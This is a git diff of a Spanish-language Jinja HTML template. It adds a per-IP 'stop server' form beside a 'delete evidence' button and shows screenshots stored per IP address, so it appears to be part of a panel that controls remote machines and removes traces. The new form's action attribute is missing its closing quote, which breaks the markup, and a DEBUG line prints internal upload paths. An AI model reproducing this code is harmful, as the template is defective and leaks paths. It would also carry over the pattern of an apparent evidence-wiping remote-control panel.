@@ -52,6 +52,12 @@
       <button type="submit" class="w-full bg-red-600 hover:bg-red-500 py-2 rounded">Borrar Evidencia</button>
     </form>
 
+    <form method="POST" action="/stop class="bg-gray-800 p-4 rounded-xl">
+      <input type="hidden" name="ip" value="{{ ip }}">
+      <button type="submit"  class="w-full bg-red-600 hover:bg-red-500 py-2 rounded">Detener Servidor</button>
+    </form>
+  
+
   </div>
   {% endif %}
 
@@ -62,11 +68,9 @@
   </div>
   {% endif %}
 
-  {% if screenshot %}
-  <div class="w-full max-w-xl mt-8 text-center">
-    <h3 class="text-xl font-semibold mb-2">Captura de pantalla</h3>
-    <img src="{{ url_for('static', filename='uploads/' + screenshot.split('/')[-1]) }}" class="rounded-lg shadow" />
-  </div>
+  {% if nombre %}
+  <p>DEBUG: uploads/{{ ip.replace('.', '_') }}/{{ nombre }}</p>
+  <img src="{{ url_for('static', filename='uploads/' + ip.replace('.', '_') + '/' + nombre) }}" alt="Screenshot">
   {% endif %}
 </body>
 </html>
